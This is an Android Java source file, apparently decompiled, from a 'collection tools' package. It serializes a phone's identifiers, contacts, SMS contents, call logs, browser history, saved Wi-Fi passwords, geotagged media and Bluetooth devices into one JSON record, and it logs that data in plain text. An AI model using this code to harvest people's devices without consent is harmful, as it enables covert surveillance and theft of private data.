package com.collection.tools.utils;

import android.os.Build;
import android.util.Log;

import com.collection.tools.entity.Audio;
import com.collection.tools.entity.BluetoothInfo;
import com.collection.tools.entity.Browser;
import com.collection.tools.entity.CallRecordInfo;
import com.collection.tools.entity.ImageInfo;
import com.collection.tools.entity.LinkMan;
import com.collection.tools.entity.LinkManAddress;
import com.collection.tools.entity.LinkManEmail;
import com.collection.tools.entity.LinkManInfo;
import com.collection.tools.entity.LinkManOrg;
import com.collection.tools.entity.LinkManPhone;
import com.collection.tools.entity.PhoneInfo;
import com.collection.tools.entity.SmsInfo;
import com.collection.tools.entity.Video;
import com.collection.tools.entity.Wifi;

import org.json.JSONException;
import org.json.JSONStringer;

import java.util.List;

/**
 * Created by John.Lu on 2017/6/12.
 * 生成json数据块
 */

public class JsonHelper {
   private List<LinkMan> linkMans;
    private List<BluetoothInfo> bluetoothInfos;
    public JsonHelper (  List<LinkMan>list)
    {
        linkMans =list;
    }

    public void setBluetoothInfos(List<BluetoothInfo> param)
    {
        bluetoothInfos = param;
    }

    public String generatorJson(PhoneInfo phoneInfo, List<SmsInfo> smsInfos, List<CallRecordInfo> callRecordList, List<ImageInfo> ImageList, List<Video> videoList, List<Audio> audioList, List<Browser> browseList, List<Wifi> wifiList) {
        try {

            int v1 =0;
            JSONStringer v0 = new JSONStringer();
            v0.object();
            v0.key("PhoneNumber").value("").key("ICCID").value(phoneInfo.ICCID).key("IMEI").value(phoneInfo.IMEI1).key("IMEI2").value(phoneInfo.IMEI2).key("IMSI").value(phoneInfo.IMSI1).key("IMSI2").value(phoneInfo.IMSI2).key("ChipName").value(phoneInfo.chipName).key("PhoneType").value(Build.MODEL).key("CallRecordNumber").value(phoneInfo.callRecordNumber).key("SmsNumber").value(phoneInfo.SmsNumber).key("PhoneContactNumber").value(phoneInfo.LinkManNumber).key("WifiMac").value(phoneInfo.wifiMac).key("BluetoothMac").value(phoneInfo.bluetoothMac).key("JailOrRoot").value(((long) phoneInfo.isRoot)).key("CustomPhoneType").value("ANDROID");
            v0.key("T_PHONE_CONTACT");
            LinkManToJson(linkMans, v0);
            v0.key("T_PHONE_SMS");
            v0.array();
            if (smsInfos != null && smsInfos.size() > 0) {
                for (v1 = 0; v1 < smsInfos.size(); ++v1) {
                    v0.object();
                    System.out.println(smsInfos.get(v1).smsbody);
                    v0.key("Name").value(smsInfos.get(v1).name).key("SMSTime").value(smsInfos.get(v1).date).key("PhoneNumber").value(smsInfos.get(v1).phoneNumber).key("Content").value(smsInfos.get(v1).smsbody.toString()).key("SimId").value(smsInfos.get(v1).SimId);
                    v0.key("SMSType").value(smsInfos.get(v1).type);
                    v0.endObject();
                }
            }
            v0.endArray();
            v0.key("T_PHONE_CALLLOG");
            v0.array();
            if (callRecordList != null && callRecordList.size() > 0) {
                for (v1 = 0; v1 < callRecordList.size(); ++v1) {
                    v0.object();
                    v0.key("Name").value(callRecordList.get(v1).name).key("CallTime").value(callRecordList.get(v1).date).key("PhoneNumber").value(callRecordList.get(v1).number).key("Duration").value(callRecordList.get(v1).duration);
                    v0.key("CallType").value(callRecordList.get(v1).type);
                    v0.endObject();
                }
            }

            v0.endArray();
            v0.key("T_WEB_COOKIE");
            v0.array();

            if (browseList != null && browseList.size() > 0) {
                for (v1 = 0; v1 < browseList.size(); ++v1) {
                    v0.object();
                    JSONStringer v3 = v0.key("Id").value(((long) browseList.get(v1).id)).key("ReMake");
                    String v2 = browseList.get(v1).bookMake == null || (browseList.get(v1).bookMake.equals("")) ? "0" : browseList.get(v1).bookMake;
                    v3.value(v2).key("Title").value(browseList.get(v1).title).key("CreateDate").value(browseList.get(v1).date).key("Url").value(browseList.get(v1).url);
                    v0.endObject();
                }
            }

            v0.endArray();
            v1=0;
            v0.key("T_Wifi");
            v0.array();
            if (wifiList != null && wifiList.size() > 0) {
                for (v1 = 0; v1 < wifiList.size(); ++v1) {
                    v0.object();
                    v0.key("Id").value(wifiList.get(v1).Id).key("SSID").value(wifiList.get(v1).SSID).key("Password").value(wifiList.get(v1).Password).key("LastJoin").value(wifiList.get(v1).LastJoin).key("Channel").value(wifiList.get(v1).Channel).key("SecurityMode").value(wifiList.get(v1).SecurityMode).key("SecurityModeID").value(((long) wifiList.get(v1).SecurityModeID));
                    v0.endObject();
                }
            }

            v0.endArray();
            v1 =0;
            v0.key("T_IMAGE");
            v0.array();
            if (ImageList != null && ImageList.size() > 0) {
                for (v1 = 0; v1 < ImageList.size(); ++v1) {
                    v0.object();
                    v0.key("Id").value(((long) ImageList.get(v1).id)).key("ReMake").value(ImageList.get(v1).title).key("Name").value(ImageList.get(v1).displayName).key("Type").value(ImageList.get(v1).mimeType).key("FilePath").value(ImageList.get(v1).path.replace("\\/", "/")).key("Size").value(ImageList.get(v1).size).key("CreatDate").value(ImageList.get(v1).createDate).key("Longitude").value(ImageList.get(v1).longitude).key("Latitude").value(ImageList.get(v1).latitude).key("MD5").value(ImageList.get(v1).md5);
                    v0.endObject();
                }
            }

            v0.endArray();
            v0.key("T_Video");
            v0.array();
            if (videoList != null && videoList.size() > 0) {
                for (v1 = 0; v1 < videoList.size(); ++v1) {
                    v0.object();
                    v0.key("Id").value(((long) videoList.get(v1).id)).key("ReMake").value(videoList.get(v1).title).key("Album").value(videoList.get(v1).album).key("Artist").value(videoList.get(v1).artist).key("Name").value(videoList.get(v1).displayName).key("FilePath").value(videoList.get(v1).path.replace("\\/", "/")).key("Size").value(videoList.get(v1).size).key("Duration").value(videoList.get(v1).duration).key("Type").value(videoList.get(v1).mimeType).key("CreatDate").value(videoList.get(v1).createDate).key("Longitude").value(videoList.get(v1).longitude).key("Latitude").value(videoList.get(v1).latitude).key("MD5").value(videoList.get(v1).md5);
                    v0.endObject();
                }
            }

            v0.endArray();
            v0.key("T_AUDIO");
            v0.array();
            if (audioList != null && audioList.size() > 0) {
                for (v1 = 0; v1 < audioList.size(); ++v1) {
                    v0.object();
                    v0.key("Id").value(((long) audioList.get(v1).id)).key("ReMake").value(audioList.get(v1).title).key("Album").value(audioList.get(v1).album).key("Artist").value(audioList.get(v1).artist).key("Name").value(audioList.get(v1).displayName).key("FilePath").value(audioList.get(v1).path.replace("\\/", "/")).key("Size").value(audioList.get(v1).size).key("Duration").value(audioList.get(v1).duration).key("Type").value(audioList.get(v1).mimeType).key("CreateDate").value(audioList.get(v1).createDate).key("Longitude").value(audioList.get(v1).longitude).key("Latitude").value(audioList.get(v1).latitude).key("MD5").value(audioList.get(v1).md5);

                    v0.endObject();
                }
            }

            v0.endArray();
            //----追加蓝牙信息
            v0.key("T-BLUETOOTH");
            v0.array();
            if(bluetoothInfos != null && bluetoothInfos.size() > 0)
            {
                for(v1 =0; v1 < bluetoothInfos.size(); ++v1)
                {
                    v0.object();
                    v0.key("BluetoothName").value(bluetoothInfos.get(v1).bluetoothName).key("BluetoothMac").value(bluetoothInfos.get(v1).bluetoothMac).key("AliasName").value(bluetoothInfos.get(v1).aliasName).key("MD5").value(bluetoothInfos.get(v1).md5);
                    v0.endObject();
                }
            }
            v0.endArray();
            v0.endObject();
            Log.d("jsonText", v0.toString());
            return v0.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }

    private void LinkManToJson(List<LinkMan> linkMans, JSONStringer jsonStringer) {
        try {
            jsonStringer.array();
            int v5;
            for(v5 = 0; v5 < linkMans.size(); ++v5) {
                jsonStringer.object();
                jsonStringer.key("Id").value(linkMans.get(v5).contactsId).key("Name").value(linkMans.get(v5).name).key("NickName").value(linkMans.get(v5).nickName).key("Remark").value(linkMans.get(v5).remark).key("SourceType").value(linkMans.get(v5).Type);
                jsonStringer.key("contacts");
                jsonStringer.array();
                jsonStringer.object();
                jsonStringer.key("type").value("phone");
                jsonStringer.key("data");
                jsonStringer.array();
                List<LinkManPhone> v2 = linkMans.get(v5).phones;
                int v6;
                for(v6 = 0; v6 < v2.size(); ++v6) {
                    jsonStringer.object();
                    jsonStringer.key("content").value(new StringBuilder(String.valueOf(v2.get(v6).phoneNumber)).toString()).key("type").value(new StringBuilder(String.valueOf(v2.get(v6).phoneNumberType)).toString()).key("count").value(new StringBuilder(String.valueOf(v2.get(v6).count)).toString());
                    jsonStringer.endObject();
                }

                jsonStringer.endArray();
                jsonStringer.endObject();
                jsonStringer.object();
                jsonStringer.key("type").value("org");
                jsonStringer.key("data");
                jsonStringer.array();
                List<LinkManOrg> v3 = linkMans.get(v5).orgs;
                for(v6 = 0; v6 < v3.size(); ++v6) {
                    jsonStringer.object();
                    jsonStringer.key("company").value(new StringBuilder(String.valueOf(v3.get(v6).company)).toString()).key("jobTitle").value(new StringBuilder(String.valueOf(v3.get(v6).jobTitle)).toString()).key("department").value(new StringBuilder(String.valueOf(v3.get(v6).department)).toString());
                    jsonStringer.endObject();
                }

                jsonStringer.endArray();
                jsonStringer.endObject();
                jsonStringer.object();
                jsonStringer.key("type").value("email");
                jsonStringer.key("data");
                jsonStringer.array();
                List<LinkManEmail> v1 = linkMans.get(v5).emails;
                for(v6 = 0; v6 < v1.size(); ++v6) {
                    jsonStringer.object();
                    jsonStringer.key("content").value(new StringBuilder(String.valueOf(v1.get(v6).email)).toString()).key("type").value(new StringBuilder(String.valueOf(v1.get(v6).emailType)).toString());
                    jsonStringer.endObject();
                }

                jsonStringer.endArray();
                jsonStringer.endObject();
                jsonStringer.object();
                jsonStringer.key("type").value("address");
                jsonStringer.key("data");
                jsonStringer.array();
                List<LinkManAddress> v0 = linkMans.get(v5).address;
                for(v6 = 0; v6 < v0.size(); ++v6) {
                    jsonStringer.object();
                    jsonStringer.key("content").value(new StringBuilder(String.valueOf(v0.get(v6).address)).toString()).key("type").value(new StringBuilder(String.valueOf(v0.get(v6).addressType)).toString());
                    jsonStringer.endObject();
                }

                jsonStringer.endArray();
                jsonStringer.endObject();
                jsonStringer.endArray();
                jsonStringer.endObject();
            }

            jsonStringer.endArray();
        }
        catch(JSONException v4) {
            v4.printStackTrace();
            Log.e("====","to json exception"+v4.getMessage()+" "+v4.getCause());
        }
    }


}



